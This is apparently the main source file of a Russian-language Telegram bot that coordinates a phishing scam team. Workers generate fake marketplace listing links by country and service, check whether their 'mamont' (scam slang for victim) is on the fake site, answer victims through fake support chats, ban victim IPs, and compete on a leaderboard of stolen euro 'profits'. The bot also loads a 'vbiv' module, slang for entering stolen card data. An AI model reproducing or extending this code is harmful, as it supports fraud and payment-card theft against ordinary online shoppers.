const { Telegraf, Markup } = require("telegraf");
const stage = require("./handlers/scenes");
const session = require("telegraf/session");
const moment = require("moment");
const { Op, Sequelize } = require("sequelize");

const {
  Items,
  settings,
  Mentors,
  users,
  items,
  BanList,
  Profits,
} = require("./database/index");
const config = require("./config");

const bot = new Telegraf(config.bot.token, { handlerTimeout: 5000 });

bot.use(session());
bot.use(require("./middlewares/main"));
bot.use(stage.middleware());

bot.action("sendRequest", async (ctx) => {
  const Settings = await settings.findOne({
    where: {
      id: 1,
    },
  });
  return ctx.scene.enter("sendRequest", {
    requestChatId: Settings.requestChatId,
  });
});

bot.action(/^mail_(.+)$/, async (ctx) => {
  return ctx.scene.enter("adMailer");
});

bot.action("siteStatus", require("./handlers/commands/worker/settings/siteStatus"));
bot.action(/^siteStatus_(on|off)$/, async (ctx) => {
  try {
    await ctx.state.user.update({
      siteStatus: ctx.match[1] == "on" ? true : false
    })

    return require("./handlers/commands/worker/settings/siteStatus")(ctx)
  } catch (err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "🤖 Возникла ошибка при обработке данных пользователя!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "🤖 Возникла ошибка при обработке данных пользователя!"
      );
    }
  }
});

bot.action(/^setSupport(Bot|Smartsupp)$/, async (ctx) => {
  try {
    if (ctx.match[1] == "Bot") {
      await ctx.state.user.update({
        supportType: "bot",
      });
      return ctx
        .editMessageText(`⚙️ <b>Установлено ТП через бота.</b>`, {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("< Назад", "typeSupport")],
          ]),
        })
        .catch((err) => err);
    } else {
      return ctx.scene.enter("setSmartsupp");
    }
  } catch (err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "🤖 Возникла ошибка при обработке данных пользователя!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "🤖 Возникла ошибка при обработке данных пользователя!"
      );
    }
  }
});

bot.action("typeSupport", async(ctx) => {
  try {
    return ctx
      .editMessageText(
        `🗂️ <b>Текущий раздел:</b>
╰ 📶 Профиль -> Настройки -> ТП

╭ ▫️ <b>Username:</b> <code>${ctx.from.first_name}</code>
├ ▫️ <b>User ID:</b> <code>${ctx.from.id}</code>
╰ ▫️ <b>Tag:</b> <code>#${ctx.state.user.tag}</code>

├ ▫️ <b>Тип ТП:</b> ${ctx.state.user.supportType == "bot" ? "Через бота" : "Smartsupp"}

ℹ️ <b>Выберите тип ТП.</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Бот", "setSupportBot"),
              Markup.callbackButton("Smartsupp", "setSupportSmartsupp")
            ],
            [Markup.callbackButton("< Назад", "settings")],
          ]),
        }
      )
      .catch((err) => err); 
  } catch(err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "🤖 Возникла ошибка при обработке данных пользователя!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "🤖 Возникла ошибка при обработке данных пользователя!"
      );
    }
  }
})

bot.action("top", async (ctx) => {
  try {
    const topList = await users.findAll({
      subQuery: false,
      attributes: {
        include: [
          [Sequelize.fn("SUM", Sequelize.col("profitSum")), "totalProfits"],
        ],
      },
      group: ["Users.id"],
      order: [[Sequelize.literal("totalProfits"), "desc"]],
      limit: 10,
    });

    var top = topList
      .map(
        (v, i) =>
          `${
            v.getDataValue("totalProfits") == 0
              ? ""
              : `<b>${i + 1}. #${v.tag}: € ${parseFloat(
                  v.getDataValue("totalProfits")
                ).toFixed(2)}</b>`
          }`
      )
      .join("\n");

    if (topList.length < 1) top = "🔍 В топе ещё никого нету";

    await ctx.deleteMessage().catch((err) => err);

    return ctx
      .replyWithPhoto(
        { url: "https://i.imgur.com/Fu7ECMZ.jpeg" },
        {
          caption: `📊 <b>ТОП 10 ПОЛЬЗОВАТЕЛЕЙ:</b>
        
${top}`,
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("< Главное меню", "menu")],
          ]),
        }
      )
      .catch((err) => err);
  } catch (err) {
console.log(err);
    try {
      return ctx.answerCbQuery(
        "🤖 Возникла ошибка при обработке данных пользователя!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "🤖 Возникла ошибка при обработке данных пользователя!"
      );
    }
  }
});

bot.command("top", async (ctx) => {
  try {
    const topList = await users.findAll({
      subQuery: false,
      attributes: {
        include: [
          [Sequelize.fn("SUM", Sequelize.col("profitSum")), "totalProfits"],
        ],
      },
      group: ["Users.id"],
      order: [[Sequelize.literal("totalProfits"), "desc"]],
      limit: 10,
    });

    var top = topList
      .map(
        (v, i) =>
          `${
            v.getDataValue("totalProfits") == 0
              ? ""
              : `<b>${i + 1}. #${v.tag}: € ${parseFloat(
                  v.getDataValue("totalProfits")
                ).toFixed(2)}</b>`
          }`
      )
      .join("\n");

    if (topList.length < 1) top = "🔍 В топе ещё никого нету";

    await ctx.deleteMessage().catch((err) => err);

    return ctx
      .replyWithPhoto(
        { url: "https://i.imgur.com/Fu7ECMZ.jpeg" },
        {
          caption: `📊 <b>ТОП 10 ПОЛЬЗОВАТЕЛЕЙ:</b>
        
${top}`,
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("♻️ Скрыть", "hide")],
          ]),
        }
      )
      .catch((err) => err);
  } catch (err) {
console.log(err);
    try {
      return ctx.answerCbQuery(
        "🤖 Возникла ошибка при обработке данных пользователя!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "🤖 Возникла ошибка при обработке данных пользователя!"
      );
    }
  }
});

bot.command("kassa", async (ctx) => {
  try {
    const kassa = await Profits.sum("eurAmount"),
      kassa_today = await Profits.sum("eurAmount", {
        where: {
          createdAt: {
            [Op.gte]: moment().startOf("day").toDate(),
          },
        },
      });
    kassa_month = await Profits.sum("eurAmount", {
      where: {
        createdAt: {
          [Op.gte]: moment().startOf("month").toDate(),
        },
      },
    });

    const countProfits = await Profits.count(),
      count_today = await Profits.count({
        where: {
          createdAt: {
            [Op.gte]: moment().startOf("day").toDate(),
          },
        },
      });
    count_month = await Profits.count({
      where: {
        createdAt: {
          [Op.gte]: moment().startOf("month").toDate(),
        },
      },
    });

    return ctx
      .reply(
        `Касса за сегодня: <b>${count_today}</b> профитов на сумму <b>${parseFloat(
          kassa_today == null ? "0" : kassa_today
        ).toFixed(2)} €</b>

Касса за месяц: <b>${count_month}</b> профитов на сумму <b>${parseFloat(
          kassa_month == null ? "0" : kassa_month
        ).toFixed(2)} €</b>	

За все время: <b>${countProfits}</b> профитов на сумму <b>${parseFloat(
          kassa == null ? "0" : kassa
        ).toFixed(2)} €</b>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
console.log(err);
    try {
      return ctx.answerCbQuery(
        "🤖 Возникла ошибка при обработке данных пользователя!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "🤖 Возникла ошибка при обработке данных пользователя!"
      );
    }
  }
});

bot.action(/^ban_(.+)$/, async (ctx) => {
  try {
    if (ctx.match[1] == "undefined")
      return ctx.replyWithHTML("❌ Не удалось ограничить доступ этой сессии!");

    const { count, rows } = await BanList.findAndCountAll({
      where: {
        ip: ctx.match[1],
        workerId: ctx.from.id,
      },
    });

    if (count > 0)
      return ctx.replyWithHTML(
        "❌ Данный адрес уже находится в черном списке!"
      );

    await BanList.create({
      ip: ctx.match[1],
      workerId: ctx.from.id,
    });

    return ctx.replyWithHTML("✅ Доступ был успешно ограничен");
  } catch (err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "🤖 Возникла ошибка при обработке данных пользователя!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "🤖 Возникла ошибка при обработке данных пользователя!"
      );
    }
  }
});

bot.action("hide", async (ctx) => {
  try {
    return ctx.deleteMessage().catch((err) => err);
  } catch (err) {
    console.log(err);
  }
});

bot.action(/^reqBack_([A-Za-z0-9_]+)$/, async (ctx) => {
  try {
    const item = await items.findOne({
      where: {
        id: ctx.match[1],
      },
    });

    return ctx.editMessageReplyMarkup(
      Markup.inlineKeyboard([
        [Markup.callbackButton(`👁️ Проверить онлайн`, `eye_${item.id}`)],
        [
          Markup.callbackButton(`Написать`, `suppportReply_${item.id}`),
          Markup.callbackButton(`Чат`, `chat_${item.id}`),
        ],
      ])
    );
  } catch (err) {
    console.log(err);
  }
});
bot.action(/^eye_([A-Za-z0-9_]+)$/, async (ctx) => {
  try {
    const item = await items.findOne({
      where: {
        id: ctx.match[1],
      },
    });

    return ctx
      .answerCbQuery(
        `${
          item.online == true
            ? "🟢 Твой мамонт на сайте!"
            : "🔴 Твой мамонт не на сайте!"
        }`
      )
      .catch((err) => err);
  } catch (err) {
    console.log(err);
  }
});

bot.action(/^chat(Open|Close)_([A-Za-z0-9_]+)$/, async (ctx) => {
  try {
    const item = await items.findOne({
      where: {
        id: ctx.match[2],
      },
    });

    await item.update({
      chatStatus: ctx.match[1] == "Open" ? 1 : 2,
    });

    return ctx
      .answerCbQuery(
        `📪 Чат поддержки был успешно ${
          ctx.match[1] == "Open" ? "открыт" : "закрыт"
        }!`
      )
      .catch((err) => err);
  } catch (err) {
    console.log(err);
  }
});
bot.action(/^chat_([A-Za-z0-9_]+)$/, async (ctx) => {
  try {
    const item = await items.findOne({
      where: {
        id: ctx.match[1],
      },
    });

    return ctx.editMessageReplyMarkup(
      Markup.inlineKeyboard([
        [
          // Markup.callbackButton("Диалог", `chatHistory_${item.id}`),
          Markup.callbackButton("Открыть", `chatOpen_${item.id}`),
        ],
        [
          // Markup.callbackButton("Открыть", `chatOpen_${item.id}`),
          // Markup.callbackButton("Закрыть", `chatClose_${item.id}`),
        ],
        [Markup.callbackButton("Назад", `reqBack_${item.id}`)],
      ])
    );
  } catch (err) {
    console.log(err);
  }
});
bot.action(/^suppportReply_(.+)$/, async (ctx) => {
  return ctx.scene.enter("replySupport");
});

bot.action("chartProfit", require("./handlers/commands/worker/profile/chart"));

bot.action("chats", require("./handlers/commands/worker/profile/chats"));

bot.command("status", require("./handlers/commands/worker/status"));

bot.action("settings", require("./handlers/commands/worker/profile/settings"));
bot.action("changeTag", async (ctx) => {
  return ctx.scene.enter("changeTag");
});

bot.action("changeWallet", async (ctx) => {
  return ctx.scene.enter("changeWallet");
});
bot.action("wallet", require("./handlers/commands/worker/profile/wallet"));

bot.action("stats", require("./handlers/commands/worker/profile/stats"));

bot.action(/^changePrice_(.+)$/, async (ctx) => {
  const item = await items.findOne({
    where: {
      id: ctx.match[1]
    }
  })

  if(!item) return ctx
  .answerCbQuery(
    `♻️ Объявление с ID ${ctx.match[1]} не найдено!`,
    true
  )
  .catch((err) => err);

  return ctx.scene.enter("changePrice", {
    itemId: ctx.match[1],
  });
});
bot.action(/^destroyAd_(.+)$/, async (ctx) => {
  try {
    const item = await items.findOne({
      where: {
        id: ctx.match[1]
      }
    })

    if(!item) return ctx
    .answerCbQuery(
      `♻️ Объявление с ID ${ctx.match[1]} не найдено!`,
      true
    )
    .catch((err) => err);

    await items.destroy({
      where: {
        id: ctx.match[1],
      },
    });
    
    await ctx
      .answerCbQuery(
        `♻️ Объявление с ID ${ctx.match[1]} было успешно удалено!
    
❣️ Спасибо, что очищаете БД!`,
        true
      )
      .catch((err) => err);

      return require("./handlers/commands/worker/profile/myAds")(ctx)
  } catch (err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "🤖 Возникла ошибка при обработке данных пользователя!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "🤖 Возникла ошибка при обработке данных пользователя!"
      );
    }
  }
});
bot.action(/^ad_(.+)$/, require("./handlers/commands/worker/ads/myAd"));
bot.action("clearMyAds", async (ctx) => {
  try {
    const destroy = await items.destroy({
      where: {
        workerId: ctx.from.id,
      },
    });

    return ctx
      .answerCbQuery(
        `♻️ Удалено: ${destroy}!
    
❣️ Спасибо, что очищаете БД!`,
        true
      )
      .catch((err) => err);
  } catch (err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "🤖 Возникла ошибка при обработке данных пользователя!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "🤖 Возникла ошибка при обработке данных пользователя!"
      );
    }
  }
});
bot.action(
  /^my_(pay|receive|other)Ads$/,
  require("./handlers/commands/worker/ads/myTypeAds")
);
bot.action("myAds", require("./handlers/commands/worker/profile/myAds"));

bot.action("profile", require("./handlers/commands/worker/profile/index"));

bot.action("mentors", require("./handlers/commands/worker/mentors/index"));
bot.action(
  /^mentor_(\d+)$/,
  require("./handlers/commands/worker/mentors/mentorInfo")
);
bot.action(/^teach_(\d+)$/, async (ctx) => {
  try {
    const mentor = await Mentors.findOne({
      where: {
        id: ctx.match[1],
      },
    });
    await users.update(
      {
        mentorId: mentor.workerId,
      },
      {
        where: {
          id: ctx.from.id,
        },
      }
    );
    if (ctx.state.user.status == 3) {
      return ctx.editMessageText(
        "⚠️ Ты наставник, ты не можешь себе выбрать наставника!",
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("< Назад", "mentors")],
          ]),
        }
      );
    }
    await ctx.telegram.sendMessage(
      mentor.workerId,
      `🧑‍🏫 <b>У тебя новый ученик <a href="tg://user?id=${ctx.from.id}">${ctx.from.username}</a></b>`,
      {
        parse_mode: "HTML",
      }
    );
    return ctx.editMessageText(
      `🧑‍🏫 <b>Ваш наставник: <a href="tg://user?id=${mentor.workerId}">${mentor.username}</a>
💬 Напишите ему в лс и перешлите это сообщение!</b>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("< Назад", "menu")],
        ]),
      }
    );
  } catch (err) {
    console.log(err);
    try {
      return ctx.answerCbQuery(
        "🤖 Возникла ошибка при обработке данных пользователя!",
        true
      );
    } catch (err) {
      return ctx.replyWithHTML(
        "🤖 Возникла ошибка при обработке данных пользователя!"
      );
    }
  }
});
bot.action("reqMentor", async (ctx) => {
  try {
    return ctx.scene.enter(`sendMentorReq`);
  } catch (err) {
    console.log(err);
    return ctx.replyWithHTML("Ошибка при обработке данных");
  }
});

bot.action("report", async (ctx) => {
  try {
    return ctx.scene.enter(`report`);
  } catch (err) {
    console.log(err);
    return ctx.replyWithHTML("Ошибка при обработке данных");
  }
});

bot.start(
  (ctx) =>
    ctx.chat.id == ctx.from.id &&
    require("./handlers/commands/worker/start")(ctx)
);
bot.action(
  "menu",
  (ctx) =>
    ctx.chat.id == ctx.from.id &&
    require("./handlers/commands/worker/start")(ctx)
);
bot.hears(
  "Главное меню",
  (ctx) =>
    ctx.chat.id == ctx.from.id &&
    require("./handlers/commands/worker/start")(ctx)
);

bot.action(
  "createLink",
  require("./handlers/commands/worker/createLink/createLink")
);
// bot.action("createLink", async(ctx) => {
//     return ctx.scene.enter("createLink")
// })
bot.action(
  /^country_([A-Za-z0-9_]+)$/,
  require("./handlers/commands/worker/createLink/selectService")
);
bot.action(/^service_([A-Za-z0-9_]+)$/, async (ctx) => {
  try {
    return ctx.scene.enter(`create_${ctx.match[1]}`);
  } catch (err) {
    console.log(err);
    return ctx.replyWithHTML("❌ Такого сервиса не существует");
  }
});

bot.action(/^reqInfo_([A-Za-z0-9_]+)$/, async (ctx) => {
  try {
    const item = await Items.findOne({
      where: {
        id: ctx.match[1],
      },
    });

    await ctx.answerCbQuery().catch((err) => err);

    await ctx.replyWithHTML(
      `<i>Объявление</i> <b>#${item.id}</b>
        
<i>Название:</i> <b>${item.title}</b>
<i>Цена:</i> <b>${item.price}</b>`,
      {
        reply_to_message_id: ctx.update.callback_query.message.message_id,
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Скрыть", "hide")],
        ]),
      }
    );
  } catch (err) {
    console.log(err);
  }
});

bot.action("hide", async (ctx) => {
  try {
    return ctx.deleteMessage().catch((err) => err);
  } catch (err) {
    console.log(err);
  }
});

bot.action("none", async (ctx) => {
  try {
    return ctx
      .answerCbQuery("Нахуй ты сюда нажимаешь", true)
      .catch((err) => err);
  } catch (err) {
    console.log(err);
  }
});

bot.use(require("./vbiv"));
bot.use(require("./panel"));

bot.use(require("./middlewares/other"));

async function startBot() {
  console.clear();

  bot
    .launch()
    .then(() => {
      console.log(`Бот успешно запущен (разработка: t.me/uglyjs)`);
    })
    .catch((err) => {
      console.log(`Ошибка при запуске бота: ${err}`);
    });
}

startBot();

bot.catch((err) => {
  console.log(`Критическая ошибка при работе бота: ${err}`)
})

process.on('unhandledRejection', e => { 
  console.log(e);
  /* exec('pm2 restart main') */
});

process.on('uncaughtException', e => { 
  console.log(e); 
  // /* exec('pm2 restart main') */
});

process.on('rejectionHandled', event => { 
  console.log(event); 
  /* exec('pm2 restart main') */
});